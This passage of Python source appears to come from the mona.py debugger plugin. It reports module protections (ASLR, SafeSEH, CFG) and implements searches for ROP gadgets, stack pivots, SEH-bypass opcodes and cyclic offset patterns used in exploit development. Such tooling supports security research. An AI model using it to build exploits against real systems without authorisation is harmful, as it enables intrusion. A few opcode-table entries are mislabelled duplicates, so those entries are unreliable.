			sname = dbg.readMemory(sec, 8).rstrip(b'\x00').decode('ascii', errors='replace')
			vsz   = struct.unpack('<L', dbg.readMemory(sec + 0x08, 4))[0]
			vaddr = struct.unpack('<L', dbg.readMemory(sec + 0x0c, 4))[0]
			rawsz = struct.unpack('<L', dbg.readMemory(sec + 0x10, 4))[0]
			chars = struct.unpack('<L', dbg.readMemory(sec + 0x24, 4))[0]
			cflag_names = [n for bit, n in SCN_CHARS if chars & bit]
			sections.append((sname, vaddr, vsz, rawsz, chars, cflag_names))
	except Exception:
		sections = []

	L = 70
	sep = "-" * L
	dbg.log(sep)
	dbg.log(" Module : %s" % fname)
	dbg.log(sep)
	dbg.log(" Full path     : %s" % p["path"])
	dbg.log(" Version       : %s" % p["version"])
	dbg.log(sep)
	if arch == 64:
		dbg.log(" Base          : 0x%016x" % base)
		dbg.log(" Top           : 0x%016x" % top)
		dbg.log(" Size          : 0x%016x (%d bytes)" % (size, size))
		dbg.log(" Entry point   : 0x%016x" % entry if entry else " Entry point   : (none)")
	else:
		dbg.log(" Base          : 0x%08x" % base)
		dbg.log(" Top           : 0x%08x" % top)
		dbg.log(" Size          : 0x%08x (%d bytes)" % (size, size))
		dbg.log(" Entry point   : 0x%08x" % entry if entry else " Entry point   : (none)")
	dbg.log(sep)
	if cbsize:
		if arch == 64:
			dbg.log(" Code section  : 0x%016x - 0x%016x (0x%x bytes)" % (cbbase, cbtop, cbsize))
		else:
			dbg.log(" Code section  : 0x%08x - 0x%08x (0x%x bytes)" % (cbbase, cbtop, cbsize))
	dbg.log(sep)
	dbg.log(" ASLR          : %s" % p["aslr"])
	if arch == 32:
		sehtable_val = p.get("sehtable", 0) or 0
		sehcount_val = p.get("sehcount", 0) or 0
		if sehtable_val and sehcount_val:
			dbg.log(" SafeSEH       : %s  (SEHandlerTable: 0x%08x, SEHandlerCount: %d)" % (p["safeseh"], sehtable_val, sehcount_val))
		else:
			dbg.log(" SafeSEH       : %s" % p["safeseh"])
	dbg.log(" NX Compat     : %s" % p["nx"])
	dbg.log(" Rebased       : %s" % p["rebase"])
	dbg.log(" CFG           : %s" % p["cfg"])

	# CFG detail — parse IMAGE_LOAD_CONFIG_DIRECTORY from memory
	GUARD_FLAGS = [
		(0x00000100, "CF_INSTRUMENTED",              "module performs CF checks"),
		(0x00000200, "CFW_INSTRUMENTED",             "module performs CF + write checks"),
		(0x00000400, "CF_FUNCTION_TABLE_PRESENT",    "guard function table present"),
		(0x00000800, "SECURITY_COOKIE_UNUSED",       "security cookie not used by CF"),
		(0x00001000, "PROTECT_DELAYLOAD_IAT",        "delay-load IAT protected"),
		(0x00002000, "DELAYLOAD_IAT_IN_OWN_SECTION", "delay-load IAT in its own section"),
		(0x00004000, "CF_EXPORT_SUPPRESSION_PRESENT","export suppression info present"),
		(0x00008000, "CF_ENABLE_EXPORT_SUPPRESSION", "export suppression enabled"),
		(0x00010000, "CF_LONGJUMP_TABLE_PRESENT",    "longjmp targets table present"),
		(0x00020000, "RF_INSTRUMENTED",              "retpoline instrumented"),
		(0x00040000, "RF_ENABLE",                    "retpoline enabled"),
		(0x00080000, "RF_STRICT",                    "retpoline strict mode"),
		(0x00100000, "RETPOLINE_PRESENT",            "retpoline present"),
		(0x00200000, "EH_CONTINUATION_TABLE_PRESENT","EH continuation table present"),
		(0x00800000, "XFG_ENABLED",                  "eXtended Flow Guard (XFG) enabled"),
		(0x01000000, "CASTGUARD_PRESENT",            "CastGuard present"),
		(0x02000000, "MEMKM_PRESENT",                "MemKM present"),
	]
	try:
		pe_off2   = struct.unpack('<L', dbg.readMemory(base + 0x3c, 4))[0]
		pe_base2  = base + pe_off2
		magic2    = struct.unpack('<H', dbg.readMemory(pe_base2 + 0x18, 2))[0]
		is_pe64_2 = (magic2 == 0x20b)
		# IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10
		if is_pe64_2:
			dd_off2 = pe_base2 + 0x18 + 0x70   # PE32+ optional header DataDirectory
		else:
			dd_off2 = pe_base2 + 0x18 + 0x60   # PE32 optional header DataDirectory
		lc_rva2  = struct.unpack('<L', dbg.readMemory(dd_off2 + 8 * 10,     4))[0]
		lc_size2 = struct.unpack('<L', dbg.readMemory(dd_off2 + 8 * 10 + 4, 4))[0]
		if lc_rva2 and lc_size2:
			lc = base + lc_rva2
			# Read the struct's own Size DWORD (first field) — more reliable than DataDirectory size
			lc_struct_size = struct.unpack('<L', dbg.readMemory(lc, 4))[0]
			if is_pe64_2:
				# IMAGE_LOAD_CONFIG_DIRECTORY64 offsets
				# SEHandlerTable/Count occupy lc+0x60 and lc+0x68.
				# GuardFlags sit at lc+0x90, so the last CFG field ends at lc+0x94.
				min_cfg_size = 0x94
				if lc_struct_size >= min_cfg_size:
					cfg_check_fp   = struct.unpack('<Q', dbg.readMemory(lc + 0x70, 8))[0]
					cfg_dispatch_fp= struct.unpack('<Q', dbg.readMemory(lc + 0x78, 8))[0]
					cfg_table_rva  = struct.unpack('<Q', dbg.readMemory(lc + 0x80, 8))[0]
					cfg_count      = struct.unpack('<Q', dbg.readMemory(lc + 0x88, 8))[0]
					guard_flags    = struct.unpack('<L', dbg.readMemory(lc + 0x90, 4))[0]
				else:
					cfg_check_fp = cfg_dispatch_fp = cfg_table_rva = cfg_count = guard_flags = None
			else:
				# IMAGE_LOAD_CONFIG_DIRECTORY32 offsets
				# GuardCFFunctionCount is DWORD (not ULONGLONG) in 32-bit struct
				# GuardFlags at lc+0x58, last CFG field ends at lc+0x5c
				min_cfg_size = 0x5c
				if lc_struct_size >= min_cfg_size:
					cfg_check_fp   = struct.unpack('<L', dbg.readMemory(lc + 0x48, 4))[0]
					cfg_dispatch_fp= struct.unpack('<L', dbg.readMemory(lc + 0x4c, 4))[0]
					cfg_table_rva  = struct.unpack('<L', dbg.readMemory(lc + 0x50, 4))[0]
					cfg_count      = struct.unpack('<L', dbg.readMemory(lc + 0x54, 4))[0]
					guard_flags    = struct.unpack('<L', dbg.readMemory(lc + 0x58, 4))[0]
				else:
					cfg_check_fp = cfg_dispatch_fp = cfg_table_rva = cfg_count = guard_flags = None
			if guard_flags is None:
				dbg.log("   GuardFlags       : (Load Config struct too small, size=0x%x, need>=0x%x)" % (lc_struct_size, min_cfg_size))
			else:
				set_gflags = [(bit, name, desc) for bit, name, desc in GUARD_FLAGS if guard_flags & bit]
				dbg.log("   GuardFlags       : 0x%08x" % guard_flags)
				for bit, name, desc in set_gflags:
					dbg.log("     [+] %-40s %s" % (name, desc))
				if cfg_count:
					if arch == 64:
						dbg.log("   CFG table        : 0x%016x  (%d entries)" % (cfg_table_rva, cfg_count))
						dbg.log("   CF check fptr    : 0x%016x" % cfg_check_fp)
						dbg.log("   CF dispatch fptr : 0x%016x" % cfg_dispatch_fp)
					else:
						dbg.log("   CFG table        : 0x%08x  (%d entries)" % (cfg_table_rva, cfg_count))
						dbg.log("   CF check fptr    : 0x%08x" % cfg_check_fp)
						dbg.log("   CF dispatch fptr : 0x%08x" % cfg_dispatch_fp)
	except Exception:
		pass

	dbg.log(" OS DLL        : %s" % p["os"])
	dbg.log(" DllChars      : 0x%04x  %s" % (dllchars, "  ".join(set_flags) if set_flags else "(none)"))
	if sections:
		dbg.log(sep)
		dbg.log(" Sections (%d):" % len(sections))
		for sname, vaddr, vsz, rawsz, chars, cflag_names in sections:
			if arch == 64:
				dbg.log("   %-8s  VA: 0x%016x  VSize: 0x%08x  RawSize: 0x%08x  Chars: 0x%08x  [%s]"
					% (sname, base + vaddr, vsz, rawsz, chars, "|".join(cflag_names)))
			else:
				dbg.log("   %-8s  VA: 0x%08x  VSize: 0x%08x  RawSize: 0x%08x  Chars: 0x%08x  [%s]"
					% (sname, base + vaddr, vsz, rawsz, chars, "|".join(cflag_names)))

	# VS_VERSION_INFO
	vi = None
	try:
		vi = MnModule.VSVersionInfo.from_memory(base)
	except Exception:
		try:
			vi = MnModule.VSVersionInfo.from_file(p["path"])
		except Exception:
			vi = None
	if vi is not None:
		# On Python 2 (Immunity), VS_VERSION_INFO strings are unicode objects.
		# Immunity's dbg.log() only accepts str (bytes). Encode to ASCII with
		# replacement so non-ASCII chars (©, ™, …) don't crash the call.
		def _vstr(v):
			if isinstance(v, str):
				return v
			try:
				return v.encode('ascii', 'replace').decode('ascii')
			except Exception:
				return repr(v)
		dbg.log(sep)
		dbg.log(" VS_VERSION_INFO:")
		try:
			fv = vi.fixed.file_version
			dbg.log("   FileVersion    : %d.%d.%d.%d" % fv)
		except Exception:
			pass
		for st in vi.string_tables:
			dbg.log("   [Language: %s]" % st.lang_id)
			STRING_KEY_ORDER = [
				"FileDescription", "ProductName", "CompanyName",
				"FileVersion", "ProductVersion",
				"OriginalFilename", "InternalName",
				"LegalCopyright", "LegalTrademarks",
				"Comments", "PrivateBuild", "SpecialBuild",
			]
			printed = set()
			for k in STRING_KEY_ORDER:
				if k in st.strings:
					dbg.log("     %-22s : %s" % (k, _vstr(st.strings[k])))
					printed.add(k)
			for k, v in st.strings.items():
				if k not in printed:
					dbg.log("     %-22s : %s" % (k, _vstr(v)))

	# ----------------------------------------------------------------
	# Dependency tree (DFS, horizontal like Linux `tree`)
	# ----------------------------------------------------------------
	def _get_imported_names(mod_base):
		"""Return sorted list of lowercase DLL names imported by the module at mod_base."""
		names = []
		try:
			pe_off   = struct.unpack('<L', dbg.readMemory(mod_base + 0x3c, 4))[0]
			pe_base  = mod_base + pe_off
			magic    = struct.unpack('<H', dbg.readMemory(pe_base + 0x18, 2))[0]
			if magic == 0x20b:
				dd_off = pe_base + 0x18 + 0x70
			else:
				dd_off = pe_base + 0x18 + 0x60
			imp_rva  = struct.unpack('<L', dbg.readMemory(dd_off + 0x08, 4))[0]
			imp_size = struct.unpack('<L', dbg.readMemory(dd_off + 0x0c, 4))[0]
			if not imp_rva or not imp_size:
				return names
			desc = mod_base + imp_rva
			idx  = 0
			while True:
				entry = desc + idx * 20
				oft = struct.unpack('<L', dbg.readMemory(entry + 0x00, 4))[0]
				tds = struct.unpack('<L', dbg.readMemory(entry + 0x04, 4))[0]
				fwd = struct.unpack('<L', dbg.readMemory(entry + 0x08, 4))[0]
				nrv = struct.unpack('<L', dbg.readMemory(entry + 0x0c, 4))[0]
				ft  = struct.unpack('<L', dbg.readMemory(entry + 0x10, 4))[0]
				if oft == 0 and tds == 0 and fwd == 0 and nrv == 0 and ft == 0:
					break
				if nrv:
					raw = dbg.readString(mod_base + nrv)
					if raw:
						n = ensure_text(raw).lower().strip()
						if n:
							names.append(n)
				idx += 1
		except Exception:
			pass
		return sorted(set(names))

	def _mod_info_by_filename(fname_lower):
		"""Return (base, version, path) for a loaded module by filename, or (0,'','')."""
		stem = os.path.splitext(fname_lower)[0]
		for _key, props in mnproc.g_modules.items():
			loaded = os.path.splitext((props.get("filename") or props.get("name", "")).lower())[0]
			if loaded == stem:
				return props.get("base", 0), props.get("version", ""), props.get("path", "")
		return 0, "", ""

	def _build_dep_tree_lines(root_fname, root_base, root_ver, root_path):
		"""
		Iterative DFS producing lines in the style of Linux `tree`:
		  root
		  ├── child1
		  │   ├── grandchild
		  │   └── grandchild2
		  └── child2
		Each label includes (version | path) before the module name.
		"""
		lines = []

		def label(name, ver, path):
			stem = os.path.splitext(name.lower())[0]
			if re.match(r'^(api-ms-win|ext-ms-win)-', stem):
				return str("(API Set) %s" % name)
			ver_s  = str(ver)  if ver  else "?"
			path_s = str(path) if path else "not loaded"
			# Encode to plain str so Immunity (Python 2) dbg.log() doesn't
			# receive a unicode object from PEB path/version strings.
			try:
				ver_s  = ver_s.encode('ascii',  'replace').decode('ascii')
				path_s = path_s.encode('ascii', 'replace').decode('ascii')
			except Exception:
				pass
			return "(%s | %s) %s" % (ver_s, path_s, name)

		# Stack entries: (display_name, base, ver, path, prefix, is_last)
		# We use an explicit stack for DFS. Children are pushed in reverse order
		# so the first child is processed first.
		visited = set()
		root_label = label(root_fname, root_ver, root_path)
		lines.append(root_label)
		visited.add(os.path.splitext(root_fname.lower())[0])

		root_children = _get_imported_names(root_base)

		# Iterative DFS. Push children in reverse order so the first child
		# is popped first (maintaining alphabetical top-to-bottom order).
		# Stack items: (fname, base, ver, path, prefix, is_last)
		dfs_stack = []
		for i, child_name in enumerate(reversed(root_children)):
			is_last_child = (i == 0)  # reversed: index 0 == last original child
			cb, cv, cp = _mod_info_by_filename(child_name)
			dfs_stack.append((child_name, cb, cv, cp, "", is_last_child))

		while dfs_stack:
			fname_n, base_n, ver_n, path_n, prefix, is_last = dfs_stack.pop()

			connector = "\\-- " if is_last else "|-- "
			lines.append(prefix + connector + label(fname_n, ver_n, path_n))

			stem_n = os.path.splitext(fname_n.lower())[0]
			if stem_n in visited or base_n == 0:
				if stem_n in visited and base_n != 0:
					lines[-1] += "  (*)"
				continue
			visited.add(stem_n)

			children = _get_imported_names(base_n)
			child_prefix = prefix + ("    " if is_last else "|   ")
			for i, child_name in enumerate(reversed(children)):
				is_last_child = (i == 0)
				cb, cv, cp = _mod_info_by_filename(child_name)
				dfs_stack.append((child_name, cb, cv, cp, child_prefix, is_last_child))

		return lines

	dep_lines = _build_dep_tree_lines(fname, base, p.get("version", ""), p.get("path", ""))
	dbg.log(sep)
	dbg.log(" Dependency tree:")
	for dl in dep_lines:
		try:
			dl = dl.encode('ascii', 'replace').decode('ascii')
		except Exception:
			pass
		dbg.log("   " + dl)

	dbg.log(sep)


# ----- ROP ----- #
def procFindROPFUNC(args):
	#default criteria
	modulecriteria={}
	modulecriteria["aslr"] = False
	#modulecriteria["rebase"] = False
	modulecriteria["os"] = False
	criteria={}
	
	modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
	ropfuncs = {}
	ropfuncoffsets ={}
	ropfuncs,ropfuncoffsets = findROPFUNC(modulecriteria,criteria)
	#report findings to log
	dbg.log("[+] Processing pointers to interesting rop functions")
	logfile = MnLog("ropfunc.txt")
	thislog = logfile.reset()
	processResults(ropfuncs,logfile,thislog,forcelower=True)
	global silent
	silent = True
	if len(ropfuncoffsets) > 0:
		dbg.log("")
		dbg.log("[+] Processing offsets to pointers to interesting rop functions")
		logfile = MnLog("ropfunc_offset.txt")
		thislog = logfile.reset()
		processResults(ropfuncoffsets,logfile,thislog,forcelower=True)			
	
def procStackPivots(args):
	procROP(args, "stackpivot")
	
def procROP(args,mode="all"):
	#default criteria
	modulecriteria={}
	modulecriteria["aslr"] = False
	modulecriteria["rebase"] = False
	modulecriteria["os"] = False

	criteria={}
	
	modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
	
	# handle optional arguments
	
	depth = 6
	maxoffset = 40
	thedistance = 8
	split = False
	fast = False
	sortedprint = False
	bypasscfg = False
	endingstr = ""
	endings = []
	technique = ""            
	
	if "depth" in args:
		if type(args["depth"]).__name__.lower() != "bool":
			try:
				depth = int(args["depth"])
			except:
				pass
	
	if "offset" in args:
		if type(args["offset"]).__name__.lower() != "bool":
			try:
				maxoffset = int(args["offset"])
			except:
				pass
	
	if "distance" in args:
		if type(args["distance"]).__name__.lower() != "bool":
			try:
				thedistance = args["distance"]
			except:
				pass
	
	if "split" in args:
		if type(args["split"]).__name__.lower() == "bool":
			split = args["split"]

	if "cfg" in args:
		bypasscfg = True

	if "s" in args:
		if type(args["s"]).__name__.lower() != "bool":
			technique = args["s"].replace("'","").replace('"',"").strip().lower()                   
			
	if "fast" in args:
		if type(args["fast"]).__name__.lower() == "bool":
			fast = args["fast"]
	
	if "end" in args:
		if type(args["end"]).__name__.lower() == "str":
			endingstr = args["end"].replace("'","").replace('"',"").strip()
			endings = endingstr.split("#")
			
	if "f" in args:
		if args["f"] != "":
			criteria["f"] = args["f"]
	
	if "sort" in args:
		sortedprint = True
	
	if "rva" in args:
		criteria["rva"] = True
	
	if mode == "stackpivot":
		fast = False
		endings = ""
		split = False
	else:
		mode = "all"

	criteria["cfg"] = bypasscfg
	
	findROPGADGETS(modulecriteria,criteria,endings,maxoffset,depth,split,thedistance,fast,mode,sortedprint,technique)
	

def procJseh(args):
	results = []
	showred=0
	showall=False
	if "all" in args:
		showall = True
	nrfound = 0
	dbg.log("-----------------------------------------------------------------------")
	dbg.log("Search for jmp/call dword[ebp/esp+nn] (and other) combinations started ")
	dbg.log("-----------------------------------------------------------------------")
	opcodej=["\xff\x54\x24\x08", #call dword ptr [esp+08]
			"\xff\x64\x24\x08", #jmp dword ptr [esp+08]
			"\xff\x54\x24\x14", #call dword ptr [esp+14]
			"\xff\x54\x24\x14", #jmp dword ptr [esp+14]
			"\xff\x54\x24\x1c", #call dword ptr [esp+1c]
			"\xff\x54\x24\x1c", #jmp dword ptr [esp+1c]
			"\xff\x54\x24\x2c", #call dword ptr [esp+2c]
			"\xff\x54\x24\x2c", #jmp dword ptr [esp+2c]
			"\xff\x54\x24\x44", #call dword ptr [esp+44]
			"\xff\x54\x24\x44", #jmp dword ptr [esp+44]
			"\xff\x54\x24\x50", #call dword ptr [esp+50]
			"\xff\x54\x24\x50", #jmp dword ptr [esp+50]
			"\xff\x55\x0c",     #call dword ptr [ebp+0c]
			"\xff\x65\x0c",     #jmp dword ptr [ebp+0c]
			"\xff\x55\x24",     #call dword ptr [ebp+24]
			"\xff\x65\x24",     #jmp dword ptr [ebp+24]
			"\xff\x55\x30",     #call dword ptr [ebp+30]
			"\xff\x65\x30",     #jmp dword ptr [ebp+30]
			"\xff\x55\xfc",     #call dword ptr [ebp-04]
			"\xff\x65\xfc",     #jmp dword ptr [ebp-04]
			"\xff\x55\xf4",     #call dword ptr [ebp-0c]
			"\xff\x65\xf4",     #jmp dword ptr [ebp-0c]
			"\xff\x55\xe8",     #call dword ptr [ebp-18]
			"\xff\x65\xe8",     #jmp dword ptr [ebp-18]
			"\x83\xc4\x08\xc3", #add esp,8 + ret
			"\x83\xc4\x08\xc2"] #add esp,8 + ret X
	fakeptrcriteria = {}
	fakeptrcriteria["accesslevel"] = "*"
	for opjc in opcodej:
		addys = []
		addys = searchInRange( [[opjc, opjc]], 0, TOP_USERLAND, fakeptrcriteria)
		results += addys
		for ptrtypes in addys:
			for ad1 in addys[ptrtypes]:
				interruptMona()
				ptr = MnPointer(ad1)
				module = ptr.belongsTo()
				if not module:
					module=""
					page   = dbg.getMemoryPageByAddress( ad1 )
					access = page.getAccess( human = True )
					op = dbg.disasm( ad1 )
					opstring=op.getDisasm()
					dbg.log("Found %s at 0x%08x - Access: (%s) - Outside of a loaded module" % (opstring, ad1, access), address = ad1,highlight=1)
					nrfound+=1
				else:
					if showall:
						page   = dbg.getMemoryPageByAddress( ad1 )
						access = page.getAccess( human = True )
						op = dbg.disasm( ad1 )
						opstring=op.getDisasm()
						thismod = MnModule(module)
						if not thismod.isSafeSEH:
						#if ismodulenosafeseh(module[0])==1:
							extratext="=== Safeseh : NO ==="
							showred=1
						else:
							extratext="Safeseh protected"
							showred=0
						dbg.log("Found %s at 0x%08x (%s) - Access: (%s) - %s" % (opstring, ad1, module,access,extratext), address = ad1,highlight=showred)
						nrfound+=1
	dbg.log("Search complete")
	if results:
		dbg.log("Found %d address(es)" % nrfound)
		return "Found %d address(es) (Check the log Windows for details)" % nrfound
	else:
		dbg.log("No addresses found")
		return "Sorry, no addresses found"

	
def procJOP(args,mode="all"):
	#default criteria
	modulecriteria={}
	modulecriteria["aslr"] = False
	modulecriteria["rebase"] = False
	modulecriteria["os"] = False

	criteria={}
	
	modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
	
	# handle optional arguments
	
	depth = 6
	
	if "depth" in args:
		if type(args["depth"]).__name__.lower() != "bool":
			try:
				depth = int(args["depth"])
			except:
				pass			
	findJOPGADGETS(modulecriteria,criteria,depth)			
	
	
def procCreatePATTERN(args):
	size = 0
	pattern = ""
	dbgp("Args: %s" % args)
	if "?" in args and args["?"] != "":
		try:
			if "0x" in args["?"].lower():
				try:
					size = int(args["?"],16)
				except:
					size = 0
			else:
				size = int(args["?"])
		except:
			size = 0

	if size == 0:
		dbg.log("Please enter a valid size",highlight=1)
	else:
		pattern = createPattern(size,args)
		dbg.log("Creating cyclic pattern of %d bytes" % size)				
		dbg.log(pattern)
		objpatternfile = MnLog("pattern.txt")
		patternfile = objpatternfile.reset(skipModuleTable=True)
		# ASCII
		objpatternfile.write("\nPattern of " + str(size) + " bytes :\n",patternfile)
		objpatternfile.write("-" * (19 + len(str(size))),patternfile)
		objpatternfile.write("\nASCII:",patternfile)
		objpatternfile.write("\n" + pattern,patternfile)
		# Hex
		patternhex = ""
		for patternchar in pattern:
			patternhex += str(hex(_ord(patternchar))).replace("0x","\\x")
		objpatternfile.write("\n\nHEX:\n",patternfile)
		objpatternfile.write(patternhex,patternfile)
		# Javascript
		patternjs = str2js(pattern)
		objpatternfile.write("\n\nJAVASCRIPT (unescape() friendly):\n",patternfile)
		objpatternfile.write(patternjs,patternfile)
		if not silent:
			dbg.log("Note: don't copy this pattern from the log window, it might be truncated !",highlight=1)
			dbg.log("It's better to open %s and copy the pattern from the file" % patternfile,highlight=1)
	return


def procOffsetPATTERN(args):
	egg = ""
	if "?" in args and args["?"] != "":
		try:
			egg = args["?"]
		except:
			egg = ""
	if egg == "":
		dbg.log("Please enter a valid target",highlight=1)
	else:
		findOffsetInPattern(egg,-1,args)
	return

# ----- Comparing file output ----- #
def procFileCOMPARE(args):
	modulecriteria={}
	criteria={}
	modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
	allfiles=[]
	tomatch=""
	checkstrict=True
	rangeval = 0
	fast = False
	if "ptronly" in args or "ptrsonly" in args:
		fast = True
	if "f" in args:
		if args["f"] != "":
			rawfilenames=args["f"].replace('"',"")
			allfiles = [getAbsolutePath(f) for f in rawfilenames.split(',')]
			dbg.log("[+] Number of files to be examined : %d " % len(allfiles))
	if "range" in args:
		if not type(args["range"]).__name__.lower() == "bool":
			strrange = args["range"].lower()
			if strrange.startswith("0x") and len(strrange) > 2 :
				rangeval = int(strrange,16)
			else:
				try:
					rangeval = int(args["range"])
				except:
					rangeval = 0
			if rangeval > 0:
				dbg.log("[+] Find overlap using pointer +/- range, value %d" % rangeval)
				dbg.log("    Note : this will significantly slow down the comparison process !")
		else:
			dbg.log("Please provide a numeric value ^(> 0) with option -range",highlight=1)
			return
	else:
		if "contains" in args:
			if type(args["contains"]).__name__.lower() == "str":
				tomatch = args["contains"].replace("'","").replace('"',"")
		if "nostrict" in args:
			if type(args["nostrict"]).__name__.lower() == "bool":
				checkstrict = not args["nostrict"]
				dbg.log("[+] Instructions must match in all files ? %s" % checkstrict)
	# maybe one of the arguments is a folder
	callfiles = allfiles
	allfiles = []
	for tfile in callfiles:
		if os.path.isdir(tfile):
			# folder, get all files from this folder
			for root,dirs,files in os.walk(tfile):
				for dfile in files:
					allfiles.append(os.path.join(root,dfile))
		else:
			allfiles.append(tfile)
	if len(allfiles) > 1:
		findFILECOMPARISON(modulecriteria,criteria,allfiles,tomatch,checkstrict,rangeval,fast)
	else:
		dbg.log("Please specify at least 2 filenames to compare",highlight=1)

# ----- Find bytes in memory ----- #
def procFind(args):
	modulecriteria={}
	criteria={}
	pattern = ""
	base = 0
	offset = 0
	top  = TOP_USERLAND
	consecutive = False
	ftype = ""
	
	level = 0
	offsetlevel = 0			
	
	if not "a" in args:
		args["a"] = "*"

	ptronly = False

	if "ptronly" in args or "ptrsonly" in args:
		ptronly = True	
	
	#search for all pointers by default
	if not "x" in args:
		args["x"] = "*"
	modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
	if criteria["accesslevel"] == "":
		return
	if not "s" in args:
		dbg.log("-s <search pattern (or filename)> is a mandatory argument",highlight=1)
		return
	pattern = args["s"]
	
	if "unicode" in args:
		criteria["unic"] = True

	if "b" in args:
		try:
			base = int(args["b"],16)
		except:
			dbg.log("invalid base address: %s" % args["b"],highlight=1)
			return
	if "t" in args:
		try:
			top = int(args["t"],16)
		except:
			dbg.log("invalid top address: %s" % args["t"],highlight=1)
			return
	if "offset" in args:
		if not args["offset"].__class__.__name__ == "bool":
			if "0x" in args["offset"].lower():
				try:
					offset = 0 - int(args["offset"],16)
				except:
					dbg.log("invalid offset value",highlight=1)
					return
			else:	
				try:
					offset = 0 - int(args["offset"])
				except:
					dbg.log("invalid offset value",highlight=1)
					return	
		else:
			dbg.log("invalid offset value",highlight=1)
			return
			
	if "level" in args:
		try:
			level = int(args["level"])
		except:
			dbg.log("invalid level value",highlight=1)
			return

	if "offsetlevel" in args:
		try:
			offsetlevel = int(args["offsetlevel"])
		except:
			dbg.log("invalid offsetlevel value",highlight=1)
			return						
			
	if "c" in args:
		dbg.log("    - Skipping consecutive pointers, showing size instead")			
		consecutive = True
		
	if "type" in args:
		if not args["type"] in ["bin","asc","ptr","instr","file","str"]:
			dbg.log("Invalid search type : %s" % args["type"], highlight=1)
			return
		ftype = args["type"]
		if ftype == "str":
			ftype = "asc"
		if ftype == "file":
			filename = args["s"].replace('"',"").replace("'","")
			#see if we can read the file
			if not os.path.isfile(filename):
				dbg.log("Unable to find/read file %s" % filename,highlight=1)
				return
	rangep2p = 0

	
	if "p2p" in args or level > 0:
		dbg.log("    - Looking for pointers to pointers")
		criteria["p2p"] = True
		if "r" in args:	
			try:
				rangep2p = int(args["r"])
			except:
				pass
			if rangep2p > 0:
				dbg.log("    - Will search for close pointers (%d bytes backwards)" % rangep2p)
		if "p2p" in args:
			level = 1
	
	
	if level > 0:
		dbg.log("    - Recursive levels : %d" % level)
	

	allpointers = findPattern(modulecriteria,criteria,pattern,ftype,base,top,consecutive,rangep2p,level,offset,offsetlevel)
		
	logfile = MnLog("find.txt")
	thislog = logfile.reset()
	processResults(allpointers,logfile,thislog,{},ptronly)
	return
	
	
# ---- Find instructions, wildcard search ----- #
def procFindWild(args):
	modulecriteria={}
	criteria={}
	pattern = ""
	patterntype = ""
	base = 0
	top  = TOP_USERLAND
	
	modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)

	if not "s" in args:
		dbg.log("-s <search pattern (or filename)> is a mandatory argument",highlight=1)
		return
	pattern = args["s"]
	
	patterntypes = ["bin","str"]
	if "type" in args:
		if type(args["type"]).__name__.lower() != "bool":
			if args["type"] in patterntypes:
				patterntype = args["type"]
			else:
				dbg.log("-type argument only takes one of these values: %s" % patterntypes,highlight=1)
				return
		else:
			dbg.log("Please specify a valid value for -type. Valid values are %s" % patterntypes,highlight=1)
			return


	if patterntype == "":
		if "\\x" in pattern:
			patterntype = "bin"
		else:
			patterntype = "str"
	
	if "b" in args:
		base,addyok = getAddyArg(args["b"])
		if not addyok:
			dbg.log("invalid base address: %s" % args["b"],highlight=1)
			return

	if "t" in args:
		top,addyok = getAddyArg(args["t"])
		if not addyok:
			dbg.log("invalid top address: %s" % args["t"],highlight=1)
			return
			
	if "depth" in args:
		try:
			criteria["depth"] = int(args["depth"])
		except:
			dbg.log("invalid depth value",highlight=1)
			return	

	if "all" in args:
		criteria["all"] = True
		
	if "distance" in args:
		if type(args["distance"]).__name__.lower() == "bool":
			dbg.log("invalid distance value(s)",highlight=1)
		else:
			distancestr = args["distance"]
			distanceparts = distancestr.split(",")
			for parts in distanceparts:
				valueparts = parts.split("=")
				if len(valueparts) > 1:
					if valueparts[0].lower() == "min":
						try:
							mindistance = int(valueparts[1])
						except:
							mindistance = 0	
					if valueparts[0].lower() == "max":
						try:
							maxdistance = int(valueparts[1])
						except:
							maxdistance = 0	
	
		if maxdistance < mindistance:
			tmp = maxdistance
			maxdistance = mindistance
			mindistance = tmp
		
		criteria["mindistance"] = mindistance
		criteria["maxdistance"] = maxdistance
				
	allpointers = findPatternWild(modulecriteria,criteria,pattern,base,top,patterntype)

	# transform the results for easy display
		
	logfile = MnLog("findwild.txt")
	thislog = logfile.reset()
	processResults(allpointers,logfile,thislog)		
	return

	
# ----- assemble: assemble instructions to opcodes ----- #
def procAssemble(args):
	opcodes = ""
	encoder = ""

	checkKeystone()

	if not 's' in args:
		dbg.log("Mandatory argument -s <opcodes> missing", highlight=1)
		return
	opcodes = args['s']
	
	if 'e' in args:
		# TODO: implement encoder support
		dbg.log("Encoder support not yet implemented", highlight=1)
		return
		encoder = args['e'].lowercase()
		if encoder not in ["ascii"]:
			dbg.log("Invalid encoder : %s" % encoder, highlight=1)
			return
	
	assemble(opcodes,encoder)
	
# ----- info: show information about an address ----- #
def procInfo(args):
	if not "a" in args:
		dbg.log("Missing mandatory argument -a", highlight=1)
		return
	
	address,addyok = getAddyArg(args["a"])
	if not addyok:
		dbg.log("%s is an invalid address" % args["a"], highlight=1)
		return
	
	ptr = MnPointer(address)
	modname = ptr.belongsTo()
	modinfo = None
	if modname != "":
		modinfo = MnModule(modname)
	rebase = ""
	rva=0
	if modinfo :
		rva = address - modinfo.moduleBase
	procFlags(args)
	dbg.log("")			
	dbg.log("[+] Information about address 0x%s" % toHex(address))
	dbg.log("    %s" % ptr.__str__())
	thepage = dbg.getMemoryPageByAddress(address)
	dbg.log("    Address is part of page 0x%08x - 0x%08x" % (thepage.getBaseAddress(),thepage.getBaseAddress()+thepage.getSize()))
	section = ""
	try:
		section = thepage.getSection()
	except:
		section = ""
	if section != "":
		dbg.log("    Section : %s" % section)
	
	if ptr.isOnStack():
		stacks = getStacks()
		stackref = ""
		for tid in stacks:
			currstack = stacks[tid]
			if currstack[0] <= address and address <= currstack[1]:
				stackref = " (Thread 0x%08x, Stack Base : 0x%08x, Stack Top : 0x%08x)" % (tid,currstack[0],currstack[1])
				break
		dbg.log("    This address is in a stack segment %s" % stackref)
	
	
	if modinfo:
		dbg.log("    Address is part of a module:")
		dbg.log("    %s" % modinfo.__str__(clickable=True))
		if rva != 0:
			dbg.log("    Offset from module base: 0x%x" % rva)
			if modinfo:
				eatlist = modinfo.getEAT()
				if address in eatlist:
